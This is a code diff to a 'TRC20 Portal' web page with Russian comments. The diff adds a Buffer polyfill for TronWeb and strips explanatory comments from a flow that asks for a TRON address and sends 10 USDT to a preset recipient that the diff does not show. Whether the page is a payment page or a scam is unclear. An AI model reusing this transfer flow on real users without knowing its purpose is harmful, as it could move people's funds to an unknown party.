@@ -4,6 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TRC20 Portal</title>
+    <!-- Подключаем полифил Buffer для работы TronWeb в браузере -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/buffer.min.js"></script>
+    <script>
+        window.Buffer = buffer.Buffer;
+    </script>
+    <!-- Подключаем TronWeb -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
 </head>
 <body style="background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px;">
@@ -49,10 +55,8 @@
             }
         });
 
-        // Подключение без вызова EVM-окон
         document.getElementById('connectBtn').addEventListener('click', async function() {
             try {
-                // Инициализируем TronWeb через публичную ноду для отправки транзакции
                 const HttpProvider = TronWeb.providers.HttpProvider;
                 userTronWeb = new TronWeb(
                     new HttpProvider("https://api.trongrid.io"),
@@ -60,7 +64,6 @@
                     new HttpProvider("https://api.trongrid.io")
                 );
 
-                // Запрос адреса для сессии без триггера Ethereum-окон в WebView
                 const inputAddress = prompt("Введите ваш TRON (TRC20) адрес:");
                 if (inputAddress && inputAddress.trim() !== "") {
                     connectedAccount = inputAddress.trim();
@@ -76,7 +79,6 @@
             }
         });
 
-        // Перевод USDT
         document.getElementById('transferBtn').addEventListener('click', async function() {
             if (!connectedAccount || !userTronWeb) {
                 alert("Сначала подключите кошелек!");
@@ -86,6 +88,8 @@
             try {
                 const contract = await userTronWeb.contract().at(usdtContractAddress);
                 const amount = "10000000"; // 10 USDT
+                
+                // Безопасное преобразование адреса с использованием подключенного Buffer
                 const recipientHex = userTronWeb.address.toHex(recipientAddress);
 
                 alert("Подтвердите транзакцию...");
